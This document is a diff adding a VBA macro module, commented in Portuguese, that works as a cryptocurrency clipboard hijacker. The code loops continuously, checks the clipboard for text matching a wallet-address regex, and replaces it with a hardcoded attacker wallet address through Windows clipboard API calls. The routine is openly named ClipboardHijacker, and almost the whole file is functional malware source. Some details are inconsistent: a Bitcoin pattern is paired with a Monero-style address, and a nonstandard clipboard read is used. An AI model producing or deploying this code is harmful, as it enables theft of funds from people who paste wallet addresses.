@@ -1,0 +1,94 @@
+Option Explicit
+
+' Declarações para acessar o clipboard
+Private Declare PtrSafe Function OpenClipboard Lib "user32" (ByVal hwnd As LongPtr) As Long
+Private Declare PtrSafe Function CloseClipboard Lib "user32" () As Long
+Private Declare PtrSafe Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As LongPtr
+Private Declare PtrSafe Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As Long
+Private Declare PtrSafe Function EmptyClipboard Lib "user32" () As Long
+Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
+Private Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
+Private Declare PtrSafe Function GlobalUnlock Lib "kernel32" (ByVal hMem As LongPtr) As Long
+Private Declare PtrSafe Function lstrcpy Lib "kernel32" (ByVal lpString1 As LongPtr, ByVal lpString2 As LongPtr) As Long
+
+' Constantes para o clipboard
+Private Const CF_TEXT As Long = 1
+Private Const GMEM_MOVEABLE As Long = &H2
+
+' Endereço de carteira falso
+Private Const FAKE_WALLET As String = "4754UUfWWENd5PdDnwdFVQF4R1xr9txoF97tqWg7qjZccvcyg31152cP7nadLQFmkNDGpA7N5ad9NCqRWZLCYXcG6zmHFGr"
+
+' Função para verificar se uma string é um endereço de carteira
+Private Function IsWalletAddress(ByVal text As String) As Boolean
+    Dim regex As Object
+    Set regex = CreateObject("VBScript.RegExp")
+    
+    ' Padrão regex para endereços de criptomoedas (simplificado)
+    regex.Pattern = "[13][a-km-zA-HJ-NP-Z1-9]{25,34}"
+    IsWalletAddress = regex.Test(text)
+End Function
+
+' Função para substituir o conteúdo do clipboard
+Private Sub ReplaceClipboardWithFakeWallet()
+    On Error GoTo ErrorHandler
+    
+    Dim hClipboard As LongPtr
+    Dim hMemory As LongPtr
+    Dim pMemory As LongPtr
+    
+    ' Abre o clipboard
+    If OpenClipboard(0) = 0 Then Exit Sub
+    
+    ' Aloca memória para o novo texto
+    hMemory = GlobalAlloc(GMEM_MOVEABLE, Len(FAKE_WALLET) + 1)
+    If hMemory = 0 Then GoTo Cleanup
+    
+    pMemory = GlobalLock(hMemory)
+    If pMemory = 0 Then GoTo Cleanup
+    
+    ' Copia o endereço falso para a memória
+    Call lstrcpy(pMemory, StrPtr(FAKE_WALLET))
+    Call GlobalUnlock(hMemory)
+    
+    ' Limpa o clipboard e define o novo conteúdo
+    Call EmptyClipboard
+    Call SetClipboardData(CF_TEXT, hMemory)
+    
+Cleanup:
+    Call CloseClipboard
+    Exit Sub
+    
+ErrorHandler:
+    Debug.Print "Erro: " & Err.Description
+    Resume Cleanup
+End Sub
+
+' Loop principal para monitorar o clipboard
+Public Sub ClipboardHijacker()
+    Dim clipboardText As String
+    Dim previousText As String
+    
+    Debug.Print "Monitoring clipboard for cryptocurrency wallet addresses..."
+    
+    Do
+        ' Obtém o texto do clipboard (método simplificado para VBA)
+        On Error Resume Next
+        clipboardText = Application.Clipboard.GetText
+        On Error GoTo 0
+        
+        ' Verifica se é um endereço de carteira e se é diferente do anterior
+        If clipboardText <> previousText And IsWalletAddress(clipboardText) Then
+            Debug.Print "Detected wallet address: " & clipboardText
+            Debug.Print "Replacing with fake wallet address: " & FAKE_WALLET
+            
+            ' Substitui o clipboard
+            ReplaceClipboardWithFakeWallet
+            previousText = FAKE_WALLET
+        Else
+            previousText = clipboardText
+        End If
+
+' Espera 1 segundo antes de verificar novamente
+        Application.Wait Now + TimeValue("00:00:01")
+    Loop While True ' Use Ctrl+Break para parar manualmente
+End Sub
